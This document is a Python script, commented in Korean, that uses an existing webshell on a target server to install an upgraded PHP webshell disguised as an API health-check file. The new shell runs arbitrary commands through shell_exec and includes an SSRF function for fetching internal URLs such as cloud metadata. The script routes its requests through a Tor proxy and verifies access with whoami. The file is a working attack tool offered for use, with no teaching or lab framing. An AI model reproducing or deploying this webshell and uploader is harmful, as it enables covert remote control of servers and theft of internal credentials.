#!/usr/bin/env python3
"""
더 나은 웹쉘 업로드 - shell_exec() 사용
system()은 출력을 직접 브라우저로 보내서 Python에서 캡처 못함
shell_exec()는 결과를 문자열로 반환
"""

import requests
import sys

def upload_webshell(target_ip):
    # 새로운 웹쉘 코드 (shell_exec 사용)
    webshell_code = """<?php
header('Content-Type: text/plain');

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "=== Command Output ===\\n";
    $output = shell_exec($cmd . " 2>&1");
    echo $output;
    echo "\\n=== End Output ===\\n";
} elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    // SSRF 기능
    $url = $_GET['url'];
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);
    echo $data;
} else {
    echo "OK - Server: " . gethostname() . " - Time: " . date('Y-m-d H:i:s');
}
?>"""

    # Upload via file write
    upload_url = f"http://{target_ip}/api/health.php"

    # 파일 쓰기 명령
    # echo를 사용해서 파일 생성
    import base64
    encoded = base64.b64encode(webshell_code.encode()).decode()

    cmd = f"echo '{encoded}' | base64 -d | sudo tee /var/www/html/www/api/health.php > /dev/null && sudo chown apache:apache /var/www/html/www/api/health.php && sudo chmod 644 /var/www/html/www/api/health.php && echo 'SUCCESS'"

    print(f"[*] 웹쉘 업로드 중...")
    print(f"[*] Target: {target_ip}")

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    try:
        # 기존 웹쉘로 새 웹쉘 업로드
        params = {'cmd': cmd}
        resp = session.get(upload_url, params=params, timeout=30)

        if resp.status_code == 200 and 'SUCCESS' in resp.text:
            print(f"[+] ✅ 웹쉘 업로드 성공!")
        else:
            print(f"[-] 업로드 실패")
            print(f"    Response: {resp.text[:200]}")
            return False

        # 테스트
        print(f"\n[*] 새 웹쉘 테스트 중...")
        params = {'cmd': 'whoami'}
        resp = session.get(upload_url, params=params, timeout=15)

        if "=== Command Output ===" in resp.text:
            output = resp.text.split("=== Command Output ===")[1].split("=== End Output ===")[0].strip()
            print(f"[+] ✅ 웹쉘 작동 확인!")
            print(f"    whoami: {output}")
            return True
        else:
            print(f"[-] 웹쉘 응답 없음")
            return False

    except Exception as e:
        print(f"[-] 에러: {e}")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    upload_webshell(target_ip)
